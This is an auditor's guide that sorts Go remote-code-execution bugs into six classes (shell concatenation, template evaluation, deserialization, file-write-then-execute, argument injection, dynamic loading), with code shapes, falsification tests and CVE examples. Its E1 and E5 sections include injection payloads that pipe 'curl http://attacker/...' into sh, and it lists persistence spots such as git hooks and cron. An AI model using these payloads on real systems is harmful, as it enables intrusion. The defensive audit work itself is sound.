# Six Phases: The Six Shapes of Go RCE

Go is memory-safe and carries no deserialization gadget chains. Every RCE falls into one of these six phases, and each phase has a **different falsification test**. Mixing criteria across phases is the single largest source of false positives in this domain.

---

## E1 Command Concatenation (a shell participates in parsing)

**Qualifies when**: a real shell (`sh` / `bash` / `cmd` / `powershell`) parses a string that contains attacker data.

```go
// Qualifies
exec.Command("sh", "-c", "tar -czf /tmp/out.tgz "+dir)
// dir = "x; curl http://attacker/s | sh"

exec.CommandContext(ctx, "bash", "-c", fmt.Sprintf("ping -c 2 %s", host))
// host = "127.0.0.1; id > /tmp/poc"
```

**Does NOT qualify** (common false positives):

```go
exec.Command("cat", "/reports/"+name)   // no shell. Path traversal, not E1
exec.Command("git", "log", branch)      // no shell
// The official docs say it plainly: os/exec is designed to bypass the shell
```

**Windows special case**: `cmd /c` and `powershell -Command` re-parse the string even when the user string is passed as a **separate argv**. PowerShell also interpolates `$()` inside strings:

```go
exec.Command("cmd", "/c", "mklink", link, target)  // an & inside target still executes
// kubelet CVE-2023-3676 has exactly this shape: unsanitized subPath -> SYSTEM RCE
// The upstream fix was not escaping: it dropped the cmd call and used the native Go symlink function
```

**Shapes that must NOT be flagged** (use these as negative samples when writing tests):

```go
exec.Command("sh", "-c", `grep "$1" f`, "sh", userValue)  // positional argument, never parsed
exec.Command("sh", "-c", "ls "+shellescape.Quote(dir))    // already escaped
```

**Characters the payload must prove**: space / `;` / `|` / `&` / `` ` `` / `$()` / newline. If any one of them is filtered, the finding is falsified.

**Variant inventory**: `os.StartProcess` (argv concatenation), `syscall.Exec`, `sh -c` hidden inside a variable (`shellVar := "sh"`), `exec.Command("/bin/sh", ...)`, and `fmt.Sprintf("...%s", user)` passed onward.

---

## E2 Template Evaluation

**Qualifies when either holds**:

1. The template **text** is controllable (not merely the data) -> arbitrary `{{ }}` actions can be injected
2. The template text is fixed, but the `FuncMap` exposes execution or file functions

```go
// Case A: template text comes from the request
tpl := r.FormValue("tpl")
template.New("x").Parse(tpl)   // {{ . }} / {{ call .F "id" }}

// Case B: the door is the FuncMap
t.Funcs(template.FuncMap{
    "run": func(c string) string { out, _ := exec.Command("sh", "-c", c).CombinedOutput(); return string(out) },
})
// {{ run "id" }} in any template is RCE, even when the template file is hard-coded in the repo
```

**Key criterion**: `.Parse(userStr)` alone is **not enough**. You must ask: which function can it reach?
- `text/template` can call methods on the data object via `{{.Method "arg"}}` and via `{{call .Fn "arg"}}`
- `html/template` reaches the same methods; only the output is escaped
- Empty FuncMap + controllable template text -> mostly data disclosure (`{{.Password}}`) or DoS (deep recursion), not RCE

**High-risk FuncMap key names** (judge by implementation, not by name): `exec` / `run` / `sh` / `cmd` / `system` / `popen` / `readfile` / `writefile` / `env` / `expandenv`.

**sprig**: `sprig.TxtFuncMap()` ships `env`, `expandenv` and `getHostByName`. It executes nothing by itself, but combined with `tpl`-style recursive evaluation or a follow-on step it amplifies. Helm's `tpl` function is the canonical amplifier: a template that renders another template.

**Go-specific**:
- Template **files** loaded from a writable directory (`ParseFiles(dir + "/" + name)`) -> becomes E4 (writing a template is writing code)
- If the object passed to `tmpl.Execute` has a `func` field, `{{call}}` invokes it directly
- Error messages leak types and package paths: reconnaissance surface, not RCE

**Falsification**: the template is a literal and the FuncMap holds only pure functions such as `upper` / `printf` -> drop the candidate.

---

## E3 Deserialization (the phase Go auditors get wrong most often)

**Core correction**: decoding `gob` / `json` / `yaml` **does not execute code by itself**. Go has no `__reduce__`, no `ObjectInputStream`, and no setters that fire automatically.

So the qualification test for E3 is not "untrusted data was decoded". It is:

> **The decoded result is used as a command, a path, a privilege, or a load target.**

```go
// Not RCE (DoS only)
gob.NewDecoder(r.Body).Decode(&job)   // can force huge preallocation / stack exhaustion

// Intermediate hop toward RCE (privilege escalation)
sess, _ := store.Get(r, "session")    // gob-decoded cookie
if sess.Values["admin"] == true { ... }  // forge identity -> admin

// Intermediate hop toward RCE (feeds E1/E4)
cfg := decodeYAML(r.Body)
exec.Command("sh", "-c", cfg.PostInstall)   // terminal phase is E1
```

**How to narrate the real case correctly** (Gogs/Gitea CVE-2018-18925/18926): session deserialization lets **an ordinary user be forged into an admin**, who then uses the **git hooks editing feature** (admin-only) to write a command -> execution. Calling this chain "gob deserialization leads to RCE" collapses 3 hops into 1, and any reviewer who reads the source will see the story was invented.

**What gob actually risks**:
- Length-prefix-driven preallocation -> memory exhaustion (a single request can kill the process)
- Types registered with `gob.Register` get instantiated -> type confusion
- A custom `GobDecode` / `UnmarshalJSON` method with **internal side effects** (writing files, executing) -> only then is it direct RCE. Extremely rare, but worth grepping.

**cookie/session specifics**:
- A `securecookie` key hard-coded in the repo -> forgeable
- `sessions.NewCookieStore([]byte("secret"))` -> same
- `HttpOnly=false` affects theft, not forgery

**Falsification**: after decoding, the value is only compared, logged, or stored -> not E3.

---

## E4 Write-Anywhere-Executed (the dominant phase in the Go ecosystem)

This phase is **invisible to `grep exec`**, yet it is the dominant RCE shape in recent Go projects.

**Qualifies when all four hold**:

1. The write path is controllable, or lands in a location that always gets executed
2. The written content is controllable
3. Permissions allow execution (or the target needs no x bit, such as cron or config)
4. **A downstream executor exists, with a triggerable moment**

Item 4 is what makes the finding falsifiable. Without a downstream executor it is only arbitrary file write.

| Landing spot | Downstream executor | Trigger |
|------|-----------|------|
| `.git/hooks/post-*` | git itself | next `git commit/merge/checkout` |
| `/etc/cron.d/*`, user crontab | cron | next minute |
| `~/.ssh/authorized_keys` | sshd | next login |
| `~/.bashrc`, `.profile` | login shell | next interactive login |
| `/etc/systemd/system/*.service` | systemd | enable/start or reboot |
| plugin directory + `plugin.Open` | the application itself | next load |
| template directory (hot reload) | the application itself | next render |
| `.github/workflows/*.yml` | GitHub Actions | next push (supply chain) |
| the `replace` directive in `go.mod` | `go build` | next build (supply chain) |
| `/etc/ld.so.preload` | dynamic linker | next launch of any process |

**Gitea CVE-2026-60004** (exploited in the wild, on KEV) is textbook E4:
- Entry: the `diffpatch` endpoint, reachable by any registered user
- Mechanism: the same patch submitted twice -> git's three-way merge produces an add conflict -> the file is written straight to disk
- Key: for a bare clone the repo root **is** `$GIT_DIR`, so `hooks/post-index-change` lands in the live hook directory
- Downstream: git executes it the next time it touches the index, running as the Gitea service account

Note that **not one line of `exec.Command`** appears in this chain. An audit that only greps for exec misses it entirely.

**Variants**: Zip Slip (`filepath.Join` during extraction without `..` validation) landing in any directory above; symlink attacks (write a symlink first, then write through it); `os.Rename` overwriting an existing binary.

**Falsification**: if `filepath.Join(fixedDir, "..", userInput)` is not followed by `strings.HasPrefix(clean, fixedDir)`, the escape is real; if the prefix check exists and `fixedDir` is not an executable location, downgrade to arbitrary file write, not RCE.

---

## E5 Argument Injection ("no shell" does not mean safe in Go)

**Qualifies when**: a single attacker-controlled argv token **starts with `-`**, and the program has a dangerous option.

```go
exec.Command("git", "clone", userURL)              // no shell
// userURL = "--upload-pack=curl http://attacker/x|sh"
// git runs the command named by upload-pack -> RCE

exec.Command("tar", "-xf", userArchive)            // tar's -I/--to-command
exec.Command("ssh", userHost, "id")                // -oProxyCommand=
exec.Command("find", dir, "-exec", ...)
exec.Command("rsync", "-e", userShell, src, dst)
```

**Boundary against E1**: E1 is "a string becomes a command line"; E5 is "one argument becomes an option". The criteria differ: for E5 you must check **argument position**. A value appended to a literal prefix (`"/reports/"+name`) cannot become an option, so it is **not** E5.

**Real case**: Gitea CVE-2026-73539 — the Context inside the external renderer command template is unescaped, allowing extra renderer arguments (`--filter` and the like); combined with a plantable filter file -> execution as the service account. CWE-88 (argument injection), not CWE-78.

**Defensive shapes**: an explicit `--` separator (`exec.Command("git", "clone", "--", url)`), allowlist validation, URL scheme validation, `shellescape` (meaningful only for E1).

**Falsification**: the argument list is entirely constant; or user data appears only in a trailing positional argument and the program has no dangerous trailing option.

---

## E6 Dynamic Loading

**Qualifies when**: the load target is controllable and the loaded artifact is already on disk (which is why it usually pairs with E4).

```go
plugin.Open(userPath)                     // Go plugin: Linux + CGO, symbols must match
syscall.Exec(binPath, argv, env)          // direct execve, bypassing os/exec semantics
db.Exec("INSTALL EXTENSION ..."); db.Exec("LOAD shellfs")   // database extension
```

**Grafana CVE-2024-9264** is the modern sample of this phase: a DuckDB SQL expression -> `LOAD shellfs` extension -> the pipe syntax in `read_csv('id > /tmp/x |')` runs the content as a shell command. It is usually described as "SQL injection", but it is really **extension loading plus interpreter built-in command execution**; classifying it as E6 is closer to the essence than "SQLi" — which is also why the patch deleted the entire SQL Expressions feature.

**Embedded interpreters**: when `goja` / `otto` / `starlark` / `cel` is exposed to users, sandbox quality decides everything. Out of the box `goja` has no file or process access, but any Go function the host registers is an escape hatch — audit it the same way as an E2 FuncMap.

**Falsification**: the load path is a constant, the artifact is not writable, and the plugin symbol name is fixed and never fed external input.

---

## Phase Composition (real vulnerabilities are almost always chains)

```
E3 decode       -> forge identity/permission -> E4 write hook -> execute   (Gogs/Gitea 2018)
E3 decode       -> controllable config field  -> E1 concat cmd  -> execute
E4 write        -> E6 load                    -> execute        (plugin class)
E5 arg injection-> external tool re-exec      -> execute        (git/pandoc class)
E2 FuncMap      -> direct execution           -> execute        (SSTI class)
```

When writing the report, list the chain **hop by hop**, each hop with `path:line`. Collapsing hops is the most common way to lose credibility.
